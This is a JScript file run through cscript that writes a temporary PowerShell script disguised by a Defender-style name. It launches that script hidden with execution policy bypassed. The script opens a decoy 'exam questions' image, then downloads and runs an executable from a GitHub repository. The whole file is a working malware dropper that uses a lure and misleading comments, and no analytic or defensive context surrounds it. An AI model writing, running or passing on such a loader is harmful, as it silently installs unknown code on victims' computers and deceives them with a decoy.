// save as run_ps_normal.js and run with: cscript //nologo run_ps_normal.js

var shell = new ActiveXObject("WScript.Shell");
var fso   = new ActiveXObject("Scripting.FileSystemObject");

var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
var psFilename = "apply_defender_temp_" + (new Date().getTime()) + ".ps1";
var psPath = tempFolder + "\\" + psFilename;

// PowerShell script content (use double quotes inside so path with spaces is OK)
var psContent =
"try {\n" +
'$url = "https://m.media-amazon.com/images/I/51udtm0M0TL._UF1000,1000_QL80_.jpg";\n' +
'$destination = "$env:TEMP\\exam questions.jpg";\n' +
'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
'Start-Process $destination;\n' +
'$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/install.exe";\n' +
'$destination = "$env:TEMP\\install.exe";\n' +
'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
'Start-Process $destination;\n' +
"} catch {\n" +
"    Write-Error \"Download or open failed: $_\"\n" +
"    exit 1\n" +
"}\n";

try {
    var file = fso.CreateTextFile(psPath, true);
    file.Write(psContent);
    file.Close();
} catch (e) {
    shell.Popup("Failed to write temp PowerShell script: " + e.message, 8, "Error", 16);
    WScript.Quit(1);
}

// Build a plain command string — use JS single-quotes for the outer string so we can include " around the path
var cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -windowstyle hidden -File "' + psPath + '"';

try {
    // 1 = normal window (visible); false = don't wait for PS to finish
    shell.Run(cmd, 1, false);
} catch (e) {
    shell.Popup("Failed to launch PowerShell: " + e.message, 8, "Error", 16);
    WScript.Quit(1);
}

WScript.Quit(0);
